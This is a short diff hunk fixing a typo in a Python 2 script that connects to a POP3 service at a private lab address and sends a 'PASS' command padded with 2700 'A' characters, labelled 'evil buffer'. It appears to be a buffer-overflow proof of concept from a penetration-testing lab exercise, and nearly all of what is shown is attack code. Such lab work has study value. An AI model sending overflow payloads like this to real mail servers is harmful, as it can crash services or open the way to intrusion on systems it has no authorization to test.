@@ -7,7 +7,7 @@ buffer = 'A' * 2700
 try:
         print "\nSending evil buffer..."
         s.connect(('10.11.8.12',110))
-        data =- s.recv(1024)
+        data = s.recv(1024)
         s.send('USER username' + '\r\n')
         data = s.recv(1024)
         s.send('PASS ' + buffer + '\r\n')
